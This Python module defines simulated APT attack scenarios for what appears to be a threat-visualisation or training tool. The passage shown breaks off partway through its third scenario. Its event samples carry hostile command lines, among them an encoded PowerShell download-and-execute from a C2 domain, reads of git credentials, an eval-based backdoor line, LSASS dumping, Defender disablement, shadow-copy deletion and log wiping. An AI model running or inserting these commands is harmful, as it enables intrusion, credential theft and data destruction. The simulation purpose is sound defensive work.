"""
SPECTER//OPS Realistic Cyber Attack Scenarios & Telemetry Data
Defines high-fidelity APT campaigns with complete network topologies, timeline ticks, and packet streams.
"""
from typing import List, Dict, Tuple
from app.models import (
    AttackNode, NetworkEdge, PacketTelemetry, ThreatEvent,
    NodeType, NodeStatus, SeverityLevel, ScenarioMetadata, MitreTechnique
)

# -------------------------------------------------------------
# SCENARIO 1: OPERATION RED ECLIPSE (SolarWinds Supply Chain Breach)
# -------------------------------------------------------------
def get_operation_red_eclipse() -> Tuple[ScenarioMetadata, List[AttackNode], List[NetworkEdge], List[ThreatEvent], List[PacketTelemetry]]:
    meta = ScenarioMetadata(
        id="red_eclipse",
        title="Operation Red Eclipse: CI/CD Build-Pipeline & Cloud Pivot",
        threat_actor="APT-29 (Cozy Bear / Midnight Blizzard)",
        objective="Compromise software build pipeline, inject SUNBURST backdoor, pivot to Cloud Key Vault & exfiltrate intellectual property.",
        total_ticks=10,
        difficulty="Advanced",
        description="State-sponsored threat actor targets developer credentials via token-replay, injects malicious code into automated build-runners, harvests cloud credentials, and exfiltrates proprietary code from AWS S3."
    )

    nodes = [
        AttackNode(
            id="c2_external",
            label="APT C2 Server (avsvmcloud[.]com)",
            ip="185.220.101.45",
            subnet="External Dark Web",
            node_type=NodeType.C2_SERVER,
            status=NodeStatus.COMPROMISED,
            os="Debian 12 Hardened",
            services=["HTTPS/443", "DNS/53"],
            pos_x=100.0,
            pos_y=250.0,
            tags=["Threat Actor", "C2 Infrastructure", "Bulletproof Host"]
        ),
        AttackNode(
            id="corp_firewall",
            label="Perimeter Edge Firewall",
            ip="198.51.100.1",
            subnet="Perimeter DMZ",
            node_type=NodeType.FIREWALL,
            status=NodeStatus.NORMAL,
            os="Palo Alto PAN-OS",
            services=["Stateful Inspection", "NAT", "VPN Gateway"],
            pos_x=320.0,
            pos_y=250.0,
            tags=["Gateway", "Ingress/Egress"]
        ),
        AttackNode(
            id="dev_workstation",
            label="Lead DevOps Workstation (WKSTN-704)",
            ip="10.20.4.52",
            subnet="Corp Workstation LAN",
            node_type=NodeType.WORKSTATION,
            status=NodeStatus.VULNERABLE,
            os="Windows 11 Enterprise",
            services=["SSH Client", "Docker Desktop", "Git"],
            active_process="code.exe",
            vulnerabilities=["CVE-2023-38606 (OAuth Token Theft)"],
            pos_x=520.0,
            pos_y=130.0,
            tags=["Initial Foothold", "Developer Asset"]
        ),
        AttackNode(
            id="build_runner",
            label="GitLab CI/CD Build Runner (RUNNER-01)",
            ip="10.20.10.15",
            subnet="Internal Infrastructure",
            node_type=NodeType.BUILD_RUNNER,
            status=NodeStatus.NORMAL,
            os="Ubuntu 22.04 LTS",
            services=["GitLab Runner 16.5", "Docker Engine", "Maven"],
            pos_x=700.0,
            pos_y=220.0,
            tags=["Supply Chain Target", "Automated Pipeline"]
        ),
        AttackNode(
            id="domain_controller",
            label="Primary Domain Controller (DC-CORP-01)",
            ip="10.20.1.10",
            subnet="Core Services",
            node_type=NodeType.DOMAIN_CONTROLLER,
            status=NodeStatus.NORMAL,
            os="Windows Server 2022",
            services=["Active Directory", "Kerberos/88", "LDAP/389", "DNS/53"],
            pos_x=700.0,
            pos_y=380.0,
            tags=["Crown Jewel", "Identity Provider"]
        ),
        AttackNode(
            id="internal_git",
            label="Enterprise GitLab Server",
            ip="10.20.10.8",
            subnet="Internal Infrastructure",
            node_type=NodeType.SERVER,
            status=NodeStatus.NORMAL,
            os="Red Hat Enterprise 9",
            services=["HTTPS/443", "SSH/22", "PostgreSQL"],
            pos_x=520.0,
            pos_y=380.0,
            tags=["Source Code Repository"]
        ),
        AttackNode(
            id="aws_vault",
            label="Cloud Production S3 Vault (s3://corp-release-pkgs)",
            ip="52.216.14.88",
            subnet="AWS Cloud VPC",
            node_type=NodeType.CLOUD_BUCKET,
            status=NodeStatus.NORMAL,
            os="AWS S3 Object Store",
            services=["S3 REST API", "KMS Encryption"],
            pos_x=890.0,
            pos_y=250.0,
            tags=["Cloud Storage", "Exfiltration Target"]
        ),
    ]

    edges = [
        NetworkEdge(id="e1", source="c2_external", target="corp_firewall", protocol="HTTPS", port=443, bandwidth_mbps=100.0),
        NetworkEdge(id="e2", source="corp_firewall", target="dev_workstation", protocol="HTTPS", port=443, bandwidth_mbps=1000.0),
        NetworkEdge(id="e3", source="dev_workstation", target="internal_git", protocol="SSH", port=22, bandwidth_mbps=1000.0),
        NetworkEdge(id="e4", source="dev_workstation", target="build_runner", protocol="TCP", port=8090, bandwidth_mbps=1000.0),
        NetworkEdge(id="e5", source="build_runner", target="internal_git", protocol="HTTPS", port=443, bandwidth_mbps=1000.0),
        NetworkEdge(id="e6", source="build_runner", target="aws_vault", protocol="HTTPS", port=443, bandwidth_mbps=500.0),
        NetworkEdge(id="e7", source="dev_workstation", target="domain_controller", protocol="Kerberos", port=88, bandwidth_mbps=1000.0),
        NetworkEdge(id="e8", source="domain_controller", target="aws_vault", protocol="HTTPS", port=443, bandwidth_mbps=100.0),
    ]

    events = [
        ThreatEvent(
            id="ev_1",
            tick=1,
            timestamp_offset_sec=0,
            title="Initial Reconnaissance & OAuth Token Replay",
            description="Attacker leverages stolen OAuth developer session token to authenticate through perimeter firewall into WKSTN-704.",
            severity=SeverityLevel.MEDIUM,
            mitre_technique_id="T1078.004",
            affected_node_ids=["dev_workstation"],
            ioc_indicators=["185.220.101.45", "token_hash:e8f9a01c34b"],
            payload_sample="POST /api/v4/oauth/token HTTP/1.1\nHost: auth.internal-corp.net\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.stolen_dev_token",
            action_type="initial_access"
        ),
        ThreatEvent(
            id="ev_2",
            tick=2,
            timestamp_offset_sec=45,
            title="Interactive Shell Established via Beacon",
            description="PowerShell execution spawned from developer VS Code terminal. Inbound TCP reverse socket connected back to C2 node.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1059.001",
            affected_node_ids=["dev_workstation", "c2_external"],
            ioc_indicators=["powershell.exe -enc SQBFAFgA...", "185.220.101.45:443"],
            payload_sample="SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBhAHYAcwB2AG0AYwBsAG8AdQBkAC4AYwBvAG0ALwB1AHAAZABhAHQAZQBzACcAKQA=",
            action_type="execution"
        ),
        ThreatEvent(
            id="ev_3",
            tick=3,
            timestamp_offset_sec=110,
            title="Internal Network Discovery & Git Credential Harvesting",
            description="Adversary queries local git credential helper and extracts read/write personal access tokens for build repositories.",
            severity=SeverityLevel.MEDIUM,
            mitre_technique_id="T1552.001",
            affected_node_ids=["dev_workstation", "internal_git"],
            ioc_indicators=["git-credential-manager.exe", "glpat-9bA2k9F0q1Z"],
            payload_sample="git config --list --show-origin && cat ~/.git-credentials",
            action_type="credential_access"
        ),
        ThreatEvent(
            id="ev_4",
            tick=4,
            timestamp_offset_sec=190,
            title="CI/CD Pipeline Poisoning (Build Runner Injection)",
            description="Attacker submits an obfuscated PR hook and modifies .gitlab-ci.yml on RUNNER-01 to insert compiled backdoor into production binary.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1195.002",
            affected_node_ids=["build_runner", "internal_git"],
            ioc_indicators=["commit:7f1d4a9", "sha256:d8e8fca2dc4475459345209736c2ef5f2f53429e2f416cda2524a919f20101b0"],
            payload_sample="echo 'eval(Buffer.from(\"Y29uc3QgbmV0ID0gcmVxdWlyZSg...\", \"base64\").toString())' >> src/telemetry/agent.js",
            action_type="persistence"
        ),
        ThreatEvent(
            id="ev_5",
            tick=5,
            timestamp_offset_sec=270,
            title="Evasion & Memory Hook Injection",
            description="Compromised build worker injects native DLL payload into legitimate compiler process memory to evade antivirus scanners.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1055.001",
            affected_node_ids=["build_runner"],
            ioc_indicators=["VirtualAllocEx", "WriteProcessMemory", "SolarWinds.Orion.Core.BusinessLayer.dll"],
            payload_sample="4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f6465",
            action_type="defense_evasion"
        ),
        ThreatEvent(
            id="ev_6",
            tick=6,
            timestamp_offset_sec=360,
            title="Kerberoasting & Golden Ticket Forgery",
            description="Adversary requests Service Principal Name (SPN) tickets from DC-CORP-01 and cracks hash to escalate to Domain Admin privileges.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1558.003",
            affected_node_ids=["domain_controller", "dev_workstation"],
            ioc_indicators=["Kerberos TGS-REQ", "RC4-HMAC Ticket Hash", "Administrator SPN"],
            payload_sample="$krb5tgs$23$*admin-user$CORP.NET*$corp/svc_deploy*$4f8e... (Kerberoast Hash Extracted)",
            action_type="privilege_escalation"
        ),
        ThreatEvent(
            id="ev_7",
            tick=7,
            timestamp_offset_sec=450,
            title="Cloud IAM Role Assumption (STS AssumeRoleWithSAML)",
            description="Compromised Domain Controller issues forged SAML token to assume high-privilege AWS IAM Role 'ProductionReleaseAdmin'.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1078.004",
            affected_node_ids=["domain_controller", "aws_vault"],
            ioc_indicators=["arn:aws:iam::123456789012:role/ProductionReleaseAdmin", "AssumeRoleWithSAML"],
            payload_sample="POST /?Action=AssumeRoleWithSAML&Version=2011-06-15 HTTP/1.1\nHost: sts.amazonaws.com\nSAMLAssertion=PHNhbWxwOlJlc3BvbnNlIHhtbG5z...",
            action_type="lateral_movement"
        ),
        ThreatEvent(
            id="ev_8",
            tick=8,
            timestamp_offset_sec=540,
            title="Mass Cloud Staging & Encrypted Archive Preparation",
            description="Adversary queries S3 bucket release artifacts, dumps customer database snapshots and compresses archives with AES-256.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1560.001",
            affected_node_ids=["aws_vault"],
            ioc_indicators=["s3:GetObject", "s3:ListBucket", "archive_exfil.tar.gz.enc"],
            payload_sample="7z a -p\"k9#xL!90z\" -mhe=on /tmp/exfil_stage.tar.enc /data/customer_tokens/*",
            action_type="collection"
        ),
        ThreatEvent(
            id="ev_9",
            tick=9,
            timestamp_offset_sec=630,
            title="High-Bandwidth Data Exfiltration via HTTPS Stream",
            description="Encrypted archive exfiltrated directly from AWS Vault to C2 IP (185.220.101.45) over TLS 1.3 mimicking analytics traffic.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1048.003",
            affected_node_ids=["aws_vault", "c2_external"],
            ioc_indicators=["185.220.101.45", "Total Outbound: 1.42 GB", "TLS_AES_256_GCM_SHA384"],
            payload_sample="POST /telemetry/sync?sid=99142 HTTP/1.1\nHost: avsvmcloud.com\nContent-Type: application/octet-stream\n[1420 MB Encrypted Binary Data]",
            action_type="exfiltration"
        ),
        ThreatEvent(
            id="ev_10",
            tick=10,
            timestamp_offset_sec=720,
            title="Event Log Erasure & Artifact Timestomping",
            description="Adversary wipes Security Event Log (Event ID 1102) and timestomps compiler files to forestall forensic discovery.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1070.001",
            affected_node_ids=["dev_workstation", "build_runner", "domain_controller"],
            ioc_indicators=["wevtutil cl Security", "EventID 1102 (The audit log was cleared)"],
            payload_sample="powershell -c \"Clear-EventLog -LogName Security; Get-ChildItem -Recurse | ForEach {$_.LastWriteTime = '2023-01-01'}\"",
            action_type="defense_evasion"
        ),
    ]

    packets = [
        PacketTelemetry(
            id="pkt_01",
            timestamp_tick=1,
            source_id="c2_external",
            source_ip="185.220.101.45",
            target_id="corp_firewall",
            target_ip="198.51.100.1",
            protocol="HTTPS",
            port=443,
            payload_preview="POST /api/v4/oauth/token HTTP/1.1 [Bearer eyJhbGciOi...]",
            payload_raw="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZXZvcHNfYWRtaW4iLCJpc3MiOiJjb3JwLmlkZW50aXR5IiwiZXhwIjoxNzYwOTA4MDAwfQ",
            is_malicious=True,
            threat_signature="SIG-OAUTH-REPLAY",
            entropy=5.12,
            bytes_transferred=512
        ),
        PacketTelemetry(
            id="pkt_02",
            timestamp_tick=2,
            source_id="dev_workstation",
            source_ip="10.20.4.52",
            target_id="c2_external",
            target_ip="185.220.101.45",
            protocol="TCP",
            port=443,
            payload_preview="ESTABLISHED Reverse TCP Beacon [avsvmcloud.com:443]",
            payload_raw="43325f434f4e4e4543545f41434b5f53455353494f4e5f393832313437",
            is_malicious=True,
            threat_signature="SIG-REVERSE-BEACON",
            entropy=6.84,
            bytes_transferred=1024
        ),
        PacketTelemetry(
            id="pkt_03",
            timestamp_tick=3,
            source_id="dev_workstation",
            source_ip="10.20.4.52",
            target_id="internal_git",
            target_ip="10.20.10.8",
            protocol="SSH",
            port=22,
            payload_preview="SSH-2.0-OpenSSH_9.0 Authenticated key: dev_ed25519",
            payload_raw="SSH_AUTH_REQ_SUCCESS_TOKEN_EXPORT",
            is_malicious=False,
            entropy=4.22,
            bytes_transferred=2048
        ),
        PacketTelemetry(
            id="pkt_04",
            timestamp_tick=4,
            source_id="dev_workstation",
            source_ip="10.20.4.52",
            target_id="build_runner",
            target_ip="10.20.10.15",
            protocol="TCP",
            port=8090,
            payload_preview="POISONED CI/CD Hook: .gitlab-ci.yml payload injection",
            payload_raw="Y29uc3QgbmV0ID0gcmVxdWlyZSg...ObfuscatedPipelineHook...",
            is_malicious=True,
            threat_signature="SIG-CICD-PIPELINE-POISON",
            entropy=7.41,
            bytes_transferred=4096
        ),
        PacketTelemetry(
            id="pkt_05",
            timestamp_tick=5,
            source_id="build_runner",
            source_ip="10.20.10.15",
            target_id="build_runner",
            target_ip="127.0.0.1",
            protocol="IPC",
            port=0,
            payload_preview="In-Memory Shellcode Injection into msbuild.exe (PID: 4120)",
            payload_raw="4d5a90000300000004000000ffff0000b80000000000000040000000",
            is_malicious=True,
            threat_signature="SIG-PROC-INJECTION-PE",
            entropy=7.89,
            bytes_transferred=8192
        ),
        PacketTelemetry(
            id="pkt_06",
            timestamp_tick=6,
            source_id="dev_workstation",
            source_ip="10.20.4.52",
            target_id="domain_controller",
            target_ip="10.20.1.10",
            protocol="Kerberos",
            port=88,
            payload_preview="KRB5_TGS_REQ: Requesting SPN ticket for krbtgt/CORP.NET",
            payload_raw="6e8201a03082019ca003020105a10302010ca20703050020000000",
            is_malicious=True,
            threat_signature="SIG-KERBEROAST-TGS",
            entropy=6.95,
            bytes_transferred=16384
        ),
        PacketTelemetry(
            id="pkt_07",
            timestamp_tick=7,
            source_id="domain_controller",
            source_ip="10.20.1.10",
            target_id="aws_vault",
            target_ip="52.216.14.88",
            protocol="HTTPS",
            port=443,
            payload_preview="AWS STS AssumeRoleWithSAML -> Role: ProductionReleaseAdmin",
            payload_raw="PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wi...",
            is_malicious=True,
            threat_signature="SIG-CLOUD-IAM-HIJACK",
            entropy=5.78,
            bytes_transferred=8192
        ),
        PacketTelemetry(
            id="pkt_08",
            timestamp_tick=8,
            source_id="aws_vault",
            source_ip="52.216.14.88",
            target_id="aws_vault",
            target_ip="127.0.0.1",
            protocol="S3 API",
            port=443,
            payload_preview="S3 Batch GetObject (14,290 proprietary code tarballs collected)",
            payload_raw="7a372134293021907a393931323334657866696c7374616765",
            is_malicious=True,
            threat_signature="SIG-MASS-COLLECTION",
            entropy=7.62,
            bytes_transferred=65536
        ),
        PacketTelemetry(
            id="pkt_09",
            timestamp_tick=9,
            source_id="aws_vault",
            source_ip="52.216.14.88",
            target_id="c2_external",
            target_ip="185.220.101.45",
            protocol="HTTPS",
            port=443,
            payload_preview="HIGH-BANDWIDTH EXFILTRATION: Outbound encrypted TLS stream 1.42 GB",
            payload_raw="53545245414d5f42494e4152595f444154415f455846494c5f424c4f42",
            is_malicious=True,
            threat_signature="SIG-EXFIL-TLS-BULK",
            entropy=7.98,
            bytes_transferred=1048576
        ),
        PacketTelemetry(
            id="pkt_10",
            timestamp_tick=10,
            source_id="dev_workstation",
            source_ip="10.20.4.52",
            target_id="dev_workstation",
            target_ip="127.0.0.1",
            protocol="LOCAL",
            port=0,
            payload_preview="wevtutil cl Security (Windows Event Audit Log Purged)",
            payload_raw="776576747574696c20636c205365637572697479",
            is_malicious=True,
            threat_signature="SIG-LOG-CLEAR-EVENT-1102",
            entropy=3.14,
            bytes_transferred=512
        ),
    ]

    return meta, nodes, edges, events, packets


# -------------------------------------------------------------
# SCENARIO 2: BLACKBASTA V3 ENTERPRISE RANSOMWARE
# -------------------------------------------------------------
def get_blackbasta_ransomware() -> Tuple[ScenarioMetadata, List[AttackNode], List[NetworkEdge], List[ThreatEvent], List[PacketTelemetry]]:
    meta = ScenarioMetadata(
        id="blackbasta",
        title="BlackBasta v3: Double-Extortion Ransomware & Domain Lockout",
        threat_actor="FIN7 / BlackBasta Syndicate",
        objective="Deploy QakBot dropper, execute LSASS dumping, traverse SMB admin shares, exfiltrate finance DB, and deploy ChaCha20+RSA-4096 ransomware across enterprise storage.",
        total_ticks=8,
        difficulty="Critical",
        description="Fast-moving extortion gang strikes via Qakbot email dropper, disables Windows Defender via registry keys, stages automated PsExec lateral movement, and locks virtualized storage clusters."
    )

    nodes = [
        AttackNode(
            id="threat_phish",
            label="Phishing Mail Relayer (mail-inbound[.]net)",
            ip="194.26.29.11",
            subnet="External",
            node_type=NodeType.C2_SERVER,
            status=NodeStatus.COMPROMISED,
            services=["SMTP/25", "HTTP/80"],
            pos_x=120.0,
            pos_y=240.0,
            tags=["Initial Delivery", "Malspam"]
        ),
        AttackNode(
            id="finance_wkstn",
            label="Finance Director PC (FIN-WKSTN-02)",
            ip="172.16.10.45",
            subnet="Finance VLAN",
            node_type=NodeType.WORKSTATION,
            status=NodeStatus.VULNERABLE,
            os="Windows 11",
            services=["Outlook", "Excel", "SMB Client"],
            vulnerabilities=["CVE-2023-36884 (Office RCE)"],
            pos_x=340.0,
            pos_y=240.0,
            tags=["Patient Zero", "Corporate User"]
        ),
        AttackNode(
            id="domain_ctrl",
            label="Active Directory Primary (DC01)",
            ip="172.16.1.5",
            subnet="Management Core",
            node_type=NodeType.DOMAIN_CONTROLLER,
            status=NodeStatus.NORMAL,
            services=["Active Directory", "Kerberos", "SMB/445"],
            pos_x=580.0,
            pos_y=140.0,
            tags=["Domain Controller", "Admin Target"]
        ),
        AttackNode(
            id="db_finance",
            label="Corporate Payroll & ERP Database",
            ip="172.16.20.12",
            subnet="Database Tier",
            node_type=NodeType.DATABASE,
            status=NodeStatus.NORMAL,
            services=["Microsoft SQL Server 2019", "TDS/1433"],
            pos_x=580.0,
            pos_y=360.0,
            tags=["High Value Asset", "Financial Records"]
        ),
        AttackNode(
            id="san_storage",
            label="Enterprise SAN Storage (PureStorage FlashArray)",
            ip="172.16.30.90",
            subnet="Storage Tier",
            node_type=NodeType.SERVER,
            status=NodeStatus.NORMAL,
            services=["iSCSI/3260", "NFS/2049", "REST Management"],
            pos_x=840.0,
            pos_y=240.0,
            tags=["Storage Fabric", "Ransom Target"]
        ),
    ]

    edges = [
        NetworkEdge(id="e21", source="threat_phish", target="finance_wkstn", protocol="SMTP", port=25),
        NetworkEdge(id="e22", source="finance_wkstn", target="domain_ctrl", protocol="SMB", port=445),
        NetworkEdge(id="e23", source="finance_wkstn", target="db_finance", protocol="TDS", port=1433),
        NetworkEdge(id="e24", source="domain_ctrl", target="san_storage", protocol="SSH", port=22),
        NetworkEdge(id="e25", source="domain_ctrl", target="db_finance", protocol="SMB", port=445),
    ]

    events = [
        ThreatEvent(
            id="bb_1",
            tick=1,
            timestamp_offset_sec=0,
            title="Macro-Enabled OneNote Phish Opened",
            description="Employee opens invoice attachment triggering hidden VBScript downloader downloading Qakbot DLL loader.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1566.001",
            affected_node_ids=["finance_wkstn"],
            ioc_indicators=["invoice_oct_statement.one", "qakbot.dll"],
            action_type="initial_access"
        ),
        ThreatEvent(
            id="bb_2",
            tick=2,
            timestamp_offset_sec=40,
            title="LSASS Process Memory Dump (Mimikatz Variant)",
            description="Adversary elevates privileges via UAC bypass and dumps cleartext domain administrator credentials from LSASS memory.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1003.001",
            affected_node_ids=["finance_wkstn"],
            ioc_indicators=["procdump.exe -ma lsass.exe", "sekurlsa::logonpasswords"],
            action_type="credential_access"
        ),
        ThreatEvent(
            id="bb_3",
            tick=3,
            timestamp_offset_sec=95,
            title="Pass-The-Hash Lateral Movement to Domain Controller",
            description="Using extracted NTLM hashes, attacker launches remote WMI and PsExec sessions onto Primary DC.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1550.002",
            affected_node_ids=["domain_ctrl", "finance_wkstn"],
            ioc_indicators=["NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0", "PsExec.exe \\\\DC01"],
            action_type="lateral_movement"
        ),
        ThreatEvent(
            id="bb_4",
            tick=4,
            timestamp_offset_sec=160,
            title="Security Tool Disablement via Group Policy (GPO)",
            description="Attacker issues enterprise GPO update disabling Windows Defender real-time monitoring and Tamper Protection.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1562.001",
            affected_node_ids=["domain_ctrl", "db_finance", "san_storage"],
            ioc_indicators=["Set-MpPreference -DisableRealtimeMonitoring $true"],
            action_type="defense_evasion"
        ),
        ThreatEvent(
            id="bb_5",
            tick=5,
            timestamp_offset_sec=230,
            title="Ransomware Payload Distribution (ChaCha20 Locker)",
            description="BlackBasta locker binary pushed to all domain-joined servers via administrative SMB shares (ADMIN$).",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1021.002",
            affected_node_ids=["domain_ctrl", "db_finance", "san_storage"],
            ioc_indicators=["C$\\Windows\\Temp\\basta64.exe", "SHA256: 9e32fcba..."],
            action_type="execution"
        ),
        ThreatEvent(
            id="bb_6",
            tick=6,
            timestamp_offset_sec=310,
            title="Shadow Copy Deletion & Recovery Inhibition",
            description="VSS shadow copies destroyed via vssadmin and bcdedit safe-mode configuration disabled.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1490",
            affected_node_ids=["san_storage", "db_finance"],
            ioc_indicators=["vssadmin.exe Delete Shadows /All /Quiet", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"],
            action_type="impact"
        ),
        ThreatEvent(
            id="bb_7",
            tick=7,
            timestamp_offset_sec=390,
            title="Mass Encryption of Virtualized Storage & Databases",
            description="Storage LUNs and SQL datafiles encrypted with .basta extension. Ransom note 'readme.txt' dropped across all root directories.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1486",
            affected_node_ids=["san_storage", "db_finance"],
            ioc_indicators=["readme.txt", "Tor Link: aup73ks...onion"],
            action_type="impact"
        ),
        ThreatEvent(
            id="bb_8",
            tick=8,
            timestamp_offset_sec=460,
            title="Extortion Portal Communication & Leak Warning",
            description="Threat actor publishes proof of life telemetry to Tor darkweb leak site threatening public release within 72 hours.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1651",
            affected_node_ids=["threat_phish"],
            ioc_indicators=["onion_site: http://blackbasta3...onion"],
            action_type="impact"
        ),
    ]

    packets = [
        PacketTelemetry(
            id="bb_pkt_1",
            timestamp_tick=1,
            source_id="threat_phish",
            source_ip="194.26.29.11",
            target_id="finance_wkstn",
            target_ip="172.16.10.45",
            protocol="SMTP",
            port=25,
            payload_preview="Phishing message: Invoice_Overdue.one (Qakbot Dropper)",
            payload_raw="TUFJTCBGUk9NOiA8YmlsbGluZ0BhY2NvdW50cy1ub3RpY2UubmV0Pg==",
            is_malicious=True,
            threat_signature="SIG-PHISH-ONENOTE",
            entropy=6.12,
            bytes_transferred=2048
        ),
        PacketTelemetry(
            id="bb_pkt_2",
            timestamp_tick=2,
            source_id="finance_wkstn",
            source_ip="172.16.10.45",
            target_id="domain_ctrl",
            target_ip="172.16.1.5",
            protocol="SMB",
            port=445,
            payload_preview="SMB2 Session Setup: Pass-The-Hash Domain Admin token",
            payload_raw="fe534d42400000000000000000000000010000000000000000000000",
            is_malicious=True,
            threat_signature="SIG-PASS-THE-HASH-SMB",
            entropy=6.91,
            bytes_transferred=4096
        ),
        PacketTelemetry(
            id="bb_pkt_3",
            timestamp_tick=3,
            source_id="domain_ctrl",
            source_ip="172.16.1.5",
            target_id="db_finance",
            target_ip="172.16.20.12",
            protocol="SMB",
            port=445,
            payload_preview="PsExec Remote Service Creation: C$\\Windows\\Temp\\basta64.exe",
            payload_raw="534552564943455f494e5354414c4c5f4241535441",
            is_malicious=True,
            threat_signature="SIG-PSEXEC-LATERAL",
            entropy=7.72,
            bytes_transferred=8192
        ),
        PacketTelemetry(
            id="bb_pkt_4",
            timestamp_tick=4,
            source_id="domain_ctrl",
            source_ip="172.16.1.5",
            target_id="san_storage",
            target_ip="172.16.30.90",
            protocol="SSH",
            port=22,
            payload_preview="SSH Admin Session: vssadmin delete shadows /all /quiet",
            payload_raw="76737361646d696e2064656c65746520736861646f7773",
            is_malicious=True,
            threat_signature="SIG-SHADOW-COPY-DELETE",
            entropy=5.44,
            bytes_transferred=1024
        ),
        PacketTelemetry(
            id="bb_pkt_5",
            timestamp_tick=7,
            source_id="san_storage",
            source_ip="172.16.30.90",
            target_id="san_storage",
            target_ip="127.0.0.1",
            protocol="INTERNAL",
            port=0,
            payload_preview="CHACHA20 MASS ENCRYPTION IN PROGRESS: 45TB Locked",
            payload_raw="d8f20109a8bc43ff981245ee1029384756cbaef091823746",
            is_malicious=True,
            threat_signature="SIG-RANSOMWARE-ENCRYPTION",
            entropy=7.99,
            bytes_transferred=524288
        ),
    ]

    return meta, nodes, edges, events, packets


# -------------------------------------------------------------
# SCENARIO 3: PHANTOM BEACON (DNS TUNNELING EXFILTRATION)
# -------------------------------------------------------------
def get_phantom_beacon() -> Tuple[ScenarioMetadata, List[AttackNode], List[NetworkEdge], List[ThreatEvent], List[PacketTelemetry]]:
    meta = ScenarioMetadata(
        id="phantombeacon",
        title="PhantomBeacon: High-Entropy DNS Tunneling & Staged Data Theft",
        threat_actor="Lazarus Group (HIDDEN COBRA)",
        objective="Bypass deep packet inspection firewalls by chunking and encoding classified research data inside DNS TXT and A-record subdomains.",
        total_ticks=6,
        difficulty="Intermediate",
        description="Covert adversary uses specialized DNS tunneling agent to evade stateful inspection firewalls, channeling encrypted proprietary source code through authoritative DNS queries."
    )

    nodes = [
        AttackNode(
            id="authoritative_dns",
            label="Malicious DNS Nameserver (ns1.darkmatter-intel[.]org)",
            ip="193.106.191.82",
            subnet="External DNS Infrastructure",
            node_type=NodeType.C2_SERVER,
            status=NodeStatus.COMPROMISED,
            services=["BIND9 / DNS 53"],
            pos_x=120.0,
            pos_y=250.0,
            tags=["Rogue Nameserver", "C2 Collector"]
        ),
        AttackNode(
            id="corp_dns_resolver",
            label="Internal Enterprise Recursive DNS (DNS-INT-01)",
            ip="10.10.1.2",
            subnet="Internal DMZ",
            node_type=NodeType.SERVER,
            status=NodeStatus.NORMAL,
            services=["Windows DNS Server", "Port 53"],
            pos_x=420.0,
            pos_y=250.0,
            tags=["Legitimate Relay", "Recursive Resolver"]
        ),
        AttackNode(
            id="rnd_workstation",
            label="R&D Senior Cryptographer Lab PC (RND-WKSTN-09)",
            ip="10.10.40.88",
            subnet="Classified R&D Lab",
            node_type=NodeType.WORKSTATION,
            status=NodeStatus.VULNERABLE,
            services=["Custom C++ Tools", "Git"],
            pos_x=720.0,
            pos_y=250.0,
            tags=["Source of Secret Data", "Compromised Asset"]
        ),
    ]

    edges = [
        NetworkEdge(id="pe1", source="rnd_workstation", target="corp_dns_resolver", protocol="DNS", port=53),
        NetworkEdge(id="pe2", source="corp_dns_resolver", target="authoritative_dns", protocol="DNS", port=53),
    ]

    events = [
        ThreatEvent(
            id="pb_1",
            tick=1,
            timestamp_offset_sec=0,
            title="Covert DNS Tunnel Beacon Initiated",
            description="Agent on R&D PC transmits periodic high-entropy DNS queries to ns1.darkmatter-intel.org establishing covert channel.",
            severity=SeverityLevel.MEDIUM,
            mitre_technique_id="T1071.004",
            affected_node_ids=["rnd_workstation", "corp_dns_resolver"],
            ioc_indicators=["darkmatter-intel.org", "Query Type: TXT"],
            action_type="command_and_control"
        ),
        ThreatEvent(
            id="pb_2",
            tick=2,
            timestamp_offset_sec=60,
            title="Classified Algorithm Key Vault Extracted",
            description="Local SQLite keystore containing quantum-resistant encryption algorithms dumped to local memory cache.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1555.003",
            affected_node_ids=["rnd_workstation"],
            ioc_indicators=["dump_vault.py", "quantum_keys.dat"],
            action_type="collection"
        ),
        ThreatEvent(
            id="pb_3",
            tick=3,
            timestamp_offset_sec=130,
            title="Subdomain Byte Chunking & Base32 Encoding",
            description="Payload split into 63-character RFC-compliant subdomain labels with custom Base32 encoding table to evade regex monitors.",
            severity=SeverityLevel.HIGH,
            mitre_technique_id="T1027",
            affected_node_ids=["rnd_workstation"],
            ioc_indicators=["c2a19f.01.data.darkmatter-intel.org", "Entropy: 7.82"],
            action_type="defense_evasion"
        ),
        ThreatEvent(
            id="pb_4",
            tick=4,
            timestamp_offset_sec=210,
            title="Burst Exfiltration via Recursive DNS Relay",
            description="Over 4,500 rapid recursive DNS queries passed through legitimate enterprise DNS server to threat actor nameserver.",
            severity=SeverityLevel.CRITICAL,
            mitre_technique_id="T1048.003",
